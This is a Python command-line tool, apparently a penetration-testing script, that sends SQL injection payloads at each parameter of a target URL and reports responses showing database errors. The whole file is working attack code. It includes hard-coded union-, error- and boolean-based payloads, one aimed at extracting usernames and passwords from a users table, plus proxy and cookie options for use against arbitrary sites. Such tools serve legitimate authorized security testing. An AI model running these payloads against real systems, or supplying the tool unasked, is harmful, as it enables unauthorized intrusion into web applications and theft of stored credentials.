#!/usr/bin/env python3
import argparse
import requests
import urllib.parse
import threading
import time
import re

# Common SQL error messages for detection
SQL_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "syntax error",
    "fatal error",
    "oracle error",
    "sql error",
    "native client",
    "unexpected end of SQL command",
    "database is locked"
]

# Advanced payloads (user-defined wordlist recommended)
UNION_BASED_TESTS = [
    "' UNION SELECT null, null --",
    "' UNION SELECT 1, 'test' --",
    "' UNION SELECT username, password FROM users --",
]
ERROR_BASED_TESTS = [
    "' OR 1=1 --",
    "' OR 'a'='a' --",
    """' OR CAST((SELECT count(*) FROM information_schema.tables) AS INT) > 0 --""",
]
BOOLEAN_BASED_TESTS = [
    "' AND 1=1 --",
    "' AND 1=0 --",
    "' AND EXISTS(SELECT * FROM users) --"
]

def check_sqli(url, param, payload, method="GET", headers=None, cookies=None, proxies=None, output_file=None):
    encoded_payload = urllib.parse.quote(payload)
    full_url = f"{url}&{param}={encoded_payload}" if '?' in url else f"{url}?{param}={encoded_payload}"

    try:
        if method.upper() == "POST":
            data = {param: payload}
            response = requests.post(url, data=data, headers=headers, cookies=cookies, proxies=proxies, timeout=5)
        else:
            response = requests.get(full_url, headers=headers, cookies=cookies, proxies=proxies, timeout=5)

        result = f"[-] No vulnerability detected for {param} with payload: {payload}"
        
        if response.status_code == 500 or any(err in response.text.lower() for err in SQL_ERRORS):
            result = f"[+] SQL Injection detected! Parameter: {param}, Payload: {payload}, URL: {full_url}"
            print(result)
        
        if output_file:
            with open(output_file, "a") as log:
                log.write(result + "\n")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")

def extract_params(url):
    parsed_url = urllib.parse.urlparse(url)
    return urllib.parse.parse_qs(parsed_url.query)

def test_sqli(url, wordlist, method="GET", headers=None, cookies=None, proxies=None, output_file=None):
    params = extract_params(url)
    if not params:
        print("[!] No parameters found in URL.")
        return
    
    try:
        with open(wordlist, 'r') as f:
            payloads = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[!] Wordlist file '{wordlist}' not found.")
        return
    
    # Adding advanced payloads
    payloads += UNION_BASED_TESTS + ERROR_BASED_TESTS + BOOLEAN_BASED_TESTS
    
    threads = []
    for param in params:
        for payload in payloads:
            thread = threading.Thread(target=check_sqli, args=(url, param, payload, method, headers, cookies, proxies, output_file))
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # Small delay to prevent overwhelming the server

    for thread in threads:
        thread.join()
    print("[+] SQL Injection testing completed.")

def main():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Detection Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com/page?id=1)")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file for SQL injection payloads")
    parser.add_argument("-m", "--method", choices=['GET', 'POST'], default="GET", help="HTTP method to use (default: GET)")
    parser.add_argument("-H", "--headers", help="Custom headers (comma-separated key:value)")
    parser.add_argument("-c", "--cookies", help="Custom cookies (key=value format)")
    parser.add_argument("-p", "--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-o", "--output", help="Output file to save results")
    
    args = parser.parse_args()

    headers = {h.split(":")[0]: h.split(":")[1].strip() for h in args.headers.split(",")} if args.headers else None
    cookies = {c.split("=")[0]: c.split("=")[1] for c in args.cookies.split(";")} if args.cookies else None
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    test_sqli(args.url, args.wordlist, method=args.method, headers=headers, cookies=cookies, proxies=proxies, output_file=args.output)

if __name__ == "__main__":
    main()
